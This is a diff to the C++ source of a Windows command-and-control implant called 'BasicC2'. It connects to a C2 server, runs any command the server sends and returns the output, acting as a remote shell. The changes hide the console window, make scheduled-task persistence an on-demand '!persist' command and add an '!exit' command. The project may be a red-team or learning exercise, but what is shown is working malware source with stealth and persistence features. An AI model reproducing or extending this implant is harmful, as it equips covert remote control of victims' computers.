@@ -143,6 +143,8 @@ string exec(string cmdStr) {
     }
     _pclose(pipe);
 
+    cout << result << endl;
+
     return result;
 }
 
@@ -192,6 +194,9 @@ int __cdecl main(int argc, char** argv)
     string serverPort = "8080";
     string prompt = "\n> ";
 
+    // HIDE CMD window 
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+
     cout << "[i] BasicC2 started" << endl;
 
     cout << "[i] trying to contact C2 server " << serverAddr << ":" << serverPort << endl;
@@ -205,11 +210,7 @@ int __cdecl main(int argc, char** argv)
 
     cout << "[i] sending initial message to C2 server" << endl;
     // Send an initial message
-    sendMsg(ConnectSocket, "\nHello master, I am your BasicC2.");
-
-    cout << "[i] trying to get persistance via schedule tasks" << endl;
-    cmdOut = persistance();
-    sendMsg(ConnectSocket, "\nI tried to make myself persistent, here is the output:\n" + cmdOut + prompt);
+    sendMsg(ConnectSocket, "\nHello master, I am your BasicC2."+prompt);
     cout << "[i] waiting for commands from server" << endl;
 
     // main functional loop:
@@ -223,10 +224,20 @@ int __cdecl main(int argc, char** argv)
             cout << "[!] connection not valid anymore, time to quit" << endl;
             break;
         }
+        else if (cmd.find("!persist") != std::string::npos)
+        {
+            cout << "[i] trying to get persistance via schedule tasks" << endl;
+            cmdOut = persistance();
+            sendMsg(ConnectSocket, "\nI tried to make myself persistent, here is the output:\n" + cmdOut + prompt);
+        }
+        else if (cmd.find("!exit") != std::string::npos)
+        {
+            sendMsg(ConnectSocket, "quitting...");
+            break;
+        }
         else
         {
             cmdOut = exec(cmd);
-            cmdOut.erase(remove(cmdOut.begin(), cmdOut.end(), '\n'), cmdOut.end());
             sendMsg(ConnectSocket, cmdOut + prompt);
             cout << "[i] sending command output to server" << endl;
         }
